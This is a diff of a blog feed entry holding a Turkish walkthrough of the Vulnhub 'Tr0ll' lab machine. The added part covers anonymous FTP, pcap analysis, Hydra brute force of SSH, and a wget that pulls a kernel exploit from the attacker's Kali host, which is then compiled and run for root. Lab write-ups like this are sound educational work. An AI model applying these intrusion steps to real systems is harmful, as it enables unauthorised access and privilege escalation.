@@ -10,16 +10,16 @@
 				<title>Tr0ll Vulnhub Writeup</title>
 				<description>&lt;h1 id=&quot;tr0ll-vulnhub&quot;&gt;Tr0ll Vulnhub&lt;/h1&gt;
 
-&lt;p&gt;Herkese merhabalar. Üniversite 1. sınıftan beri hep ertelediğim işi artık yapacağım! Yani Blog tutucam :) Elimden geldiğince faydalı olacağını düşündüğüm yazılar yazmaya çalışacağım. Umarım faydalı olur. O zaman başlayalım artık.&lt;/p&gt;
+&lt;p&gt;Herkese merhabalar. Üniversite 1. sınıftan beri hep ertelediğim işi artık yapacağım! Yani Blog tutucam :) Elimden geldiğince faydalı olacağını düşündüğüm yazılar yazmaya çalışacağım. Umarım faydalı olur. O zaman başlayalım.&lt;/p&gt;
 
-&lt;p&gt;Bu yazı da sizlere Tr0ll isimli zaafiyetli makinenin çözümünü anlatacağım.Öncelikle makineyi indirmek için;&lt;/p&gt;
+&lt;p&gt;Bu yazı da sizlere Tr0ll isimli zaafiyetli makinenin çözümünü anlatacağım. Öncelikle makineyi indirmek için;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/tr0ll-1,100/&quot;&gt;https://www.vulnhub.com/entry/tr0ll-1,100/&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;Makineyi sanal ortamda kurulumunu tamamlandıktan sonra zaafiyetli makinenin ıp adresini tespit edip işe koyuluyoruz.&lt;br /&gt;
-Benim kali makinemin ıp adresi 192.168.100.129..&lt;/p&gt;
+&lt;p&gt;Makinenin sanal ortamda kurulumunu tamamlandıktan sonra zaafiyetli makinenin ıp adresini tespit edip işe koyuluyoruz.&lt;br /&gt;
+Benim kali makinemin ıp adresi 192.168.100.129.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ netdiscover -r 192.168.100.0/24 
 &lt;/code&gt;&lt;/pre&gt;
@@ -27,7 +27,7 @@ Benim kali makinemin ıp adresi 192.168.100.129..&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/tr0ll/netd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;diyerekten makinenin ıp adresini buluyoruz.Bende 192.168.100.140 olarak gözüküyor.Ip adresini de bulduğumuza göre bir nmap taraması atıp yolumuzu buluyoruz.&lt;/p&gt;
+&lt;p&gt;diyerekten makinenin ıp adresini buluyoruz.Bende 192.168.100.140 olarak gözüküyor. Ip adresini de bulduğumuza göre bir nmap taraması atıp yolumuzu buluyoruz.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/nmap.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
 
@@ -37,7 +37,7 @@ Benim kali makinemin ıp adresi 192.168.100.129..&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;-sV - - - &amp;gt; Hangi servisin çalışdığını bilmek yetmez versiyon bilgileride lazımdır.Çalışan servislerin versiyon bilgisini verir.&lt;/p&gt;
+  &lt;p&gt;-sV - - - &amp;gt; Hangi servisin çalıştığını bilmek yetmez versiyon bilgileride lazımdır.Çalışan servislerin versiyon bilgisini verir.&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
@@ -57,14 +57,14 @@ Benim kali makinemin ıp adresi 192.168.100.129..&lt;/p&gt;
 &lt;blockquote&gt;
   &lt;p&gt;1-) ftp servisi açık ve anonymous kullanıcılarına açık.&lt;br /&gt;
 2-) ssh servisi açık.&lt;br /&gt;
-3-) http servisi açık ve çoğu zaman karşılaştığımız robots.txt dosyası bulunuyor.(robots.txt dosyasına arama motorları tarafından indexlenmesini istemediğimiz url leri yazarız.)Ve secret url bulunuyor.&lt;/p&gt;
+3-) http servisi açık ve çoğu zaman karşılaştığımız robots.txt dosyası bulunuyor.(robots.txt dosyasına arama motorları tarafından indexlenmesini istemediğimiz url bilgilerini yazarız.)Ve secret url bulunuyor.&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;Öncelikle http servisinde neler bekliyor bizi bakıyoruz.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/tr0ll/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Kaynak koduna falan bakıyoruz. Cıks ekmek yok buradan. O zaman robots dosyasına bi göz gezdirelim.&lt;/p&gt;
+&lt;p&gt;Kaynak koduna falan bakıyoruz. Cıks ekmek yok buradan. O zaman robots dosyasına göz gezdirelim.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/tr0ll/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -74,11 +74,95 @@ Benim kali makinemin ıp adresi 192.168.100.129..&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/tr0ll/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Kullanıcı adı anonymous password anonymous olarak giriş yapabiliyoruz. ls komutu ile burada neler tutuluyor diye baktığımızda lol.pcap adında dosyayı görüyoruz. Dosyayı isterseniz get dosyaAdi şeklindede kendi makinenize çekebilirsiniz isterseniz browser üzerinden ftp://ıp-adresi diyerekten görüntüleyip indirirebilirsiniz.&lt;/p&gt;
+&lt;p&gt;Kullanıcı adı anonymous password anonymous olarak giriş yapabiliyoruz. ls komutu ile burada neler tutuluyor diye baktığımızda lol.pcap adında dosyayı görüyoruz. Bildiğiniz gibi pcap dosyaları ağ trafiğini gösteren dosyalardır ve wireshark programı ile incelenebiliyor. Dosyayı isterseniz get dosyaAdi şeklinde kendi makinenize çekebilirsiniz isterseniz browser üzerinden ftp://ıp-adresi diyerekten görüntüleyip indirebilirsiniz.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/tr0ll/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Bildiğiniz gibi pcap dosyaları ağ trafiğini gösteren dosyalarıdır ve wireshark programı ile incelenebiliyor.&lt;/p&gt;
+&lt;p&gt;Pcap dosyasını indirip wireshark ile incelediğimde bir FTP-DATA içerisinde bir mesajla karşılaşıyorum.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bize sup3rs3cr3tdirlol bulmamızı söylüyor. Hemen browser üzerinde url’e yazıyoruz ve sonuc;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dosyayı indirip file komutu ile baktığımda ELF dosyası olduğunu gördüm. Yani linux üzerinde çalışan bir dosya. Bu yüzden dosyaya chmod komutu ile çalıştırma izni verip çalıştırdım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;0x0856BF adresini bulmamızı istiyordu. Bu adresi aratırken bir anda istemeden bu makinenin çözümünü yazan elemanın sayfasında buldum kendimi. Ve yine url de aramamız gerekiyormuş. Hemen url’e bu değeri yazdım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;good_luck isimli klasöre girdiğimde which_one_lol.txt adlı dosya vardı ve içerinde kullanıcı isimleri bulunduruyordu. Diğer klasörün içerisinde ise Pass.txt dosyası bulunuyordu ve içinde ‘Good_job_:)’ yazıyordu.&lt;/p&gt;
+
+&lt;p&gt;Başta attığımız nmap taramasında hatırlarsanız ssh servisi açıktı ve bu kullanıcı isimleri ve parola ssh ile bağlanmamızı sağlayabilir. Bu yüzden bu dosyları indirip hydra aracı ile ssh servisine brute force yaptım.&lt;/p&gt;
+
+&lt;p&gt;Fakat denedim denedim olmadı işe yaramıyordu. Bu böyle olmazdı ve kopya çektim:) Ben Pass.txt dosyası içerisindeki ‘Good_job_:)’ yazısını paroladır ancak diye düşünüyordum fakat parola ‘Pass.txt’ imiş. Yani dosyanın ismi.&lt;/p&gt;
+
+&lt;p&gt;Makineyi hazırlayan arkadaşları tebrik ediyorum. Makine isminin hakkını veriyor abi. Tam troller…&lt;/p&gt;
+
+&lt;p&gt;Neyse hydra ile brute force yaptıktan sonra bakıyoruz ve BİNGO …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Parametrelerden kısaca bahsedersem;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;-L - - - &amp;gt; Bu paramatre ile kullanıcı adlarının olduğu listeyi belirtiriz. Eğer ‘-l’ olsaydı tek kullanıcı olduğunu belirtmiş olurduk. Burada dosya içersinden teker teker dener.&lt;br /&gt;
+-p - - - &amp;gt; Bu parametre ile parola olarak ‘Pass.txt’ kullanmasını söyledik.&lt;br /&gt;
+ssh - - - &amp;gt; ssh servisine brute force yapacağımız belirttik.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ve kullanıcı adı ‘overflow’ parola ‘Pass.txt’ olduğunu öğrendik.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh overflow@192.168.100.140
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Ve içerdeyiz canım kurban.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hemen kullanıcı bilgisine ve çekirdek bilgisine bakalım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Burada root yetkisine sahip komutlara baktım acaba buradan yürüyebilirmiyim diye fakat birşey çıkmadı. Daha sonra öğrendiğim çekirdek bilgisinden yola çıkarak zaafiyetini aradım ve exploit-db de yayınlanmış olan zaafiyetini gördüm.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Exploit dosyasını kali makineme indirdim. Buradan python ile http servisi başlattım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -m SimpleHTTPServer 8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Ssh ile bağlandığım zaafiyetle makinede /tmp klasörine gittim. Linux da tmp klasörü geçici dosyalarının tutlduğu yerdir. Yani buraya dosya yazabilirsiniz. Burada ;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://192.168.100.129:8080/37292.c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;komutu ile exploit dosyasını zaafiyetli makineye çektim.&lt;/p&gt;
+
+&lt;p&gt;Exploit dosyası c dosyası olduğu için öncelikle bu dosyayı derleyip çalışabilir hale getirdim.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc 37292.c -o exploit 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve exploiti çalıştırdığımda artık rootum.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Artık root klasörüne gidebiliriz. Burada dikkatimizi proof.txt dosyası çekiyor . Zaten makinede okumamız istenen dosya bu. Ve Dosyayı okuduğumuzda Mission Complete…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tr0ll/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 </description>
 				<pubDate>Tue, 11 Apr 2017 00:00:00 +0300</pubDate>
